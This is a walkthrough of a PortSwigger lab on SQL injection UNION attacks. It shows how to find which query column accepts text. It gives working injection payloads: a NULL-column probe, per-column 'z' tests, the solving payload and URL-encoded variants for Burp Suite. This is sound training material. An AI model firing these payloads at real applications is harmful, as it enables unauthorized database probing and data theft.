# Lab: SQL injection UNION attack, finding a column containing text

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

![lab-sql-find-text-column.png](./lab-sql-injection-union-attack-finding-a-column-containing-text/lab-sql-find-text-column.png)

# Attack Payload

### Base Payload

```sql
'UNION SELECT NULL,NULL,NULL--
```

## Test First Column

```sql
'UNION SELECT 'z',NULL,NULL--
```

![screenshot00](./lab-sql-injection-union-attack-finding-a-column-containing-text/screenshot00.png)

## Test Second Column

```sql
'UNION SELECT NULL,'z',NULL--
```

![screenshot01](./lab-sql-injection-union-attack-finding-a-column-containing-text/screenshot01.png)

## Test Third Column

```sql
'UNION SELECT NULL,NULL,'z'--
```

![screenshot02](./lab-sql-injection-union-attack-finding-a-column-containing-text/screenshot02.png)

# Perform Attack

```sql
'UNION SELECT NULL,'Jzg8gb',NULL--
```

![lab-solved-sql-find-text-column.png](./lab-sql-injection-union-attack-finding-a-column-containing-text/lab-solved-sql-find-text-column.png)

# Other Solutions

## Burp Suite

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter: `'+UNION+SELECT+NULL,NULL,NULL--`
3. Try replacing each null with the random value provided by the lab, for example: `'+UNION+SELECT+'abcdef',NULL,NULL--`
4. If an error occurs, move on to the next null and try that instead.

## Community Solutions

Rana Khalil

[SQL Injection - Lab #4 SQL injection UNION attack, finding a column containing text](https://youtu.be/SGBTC5D7DTs)

Michael Sommer

[SQL injection UNION attack, finding a column containing text (Video solution, Audio)](https://youtu.be/9Bpoq-heIOo)
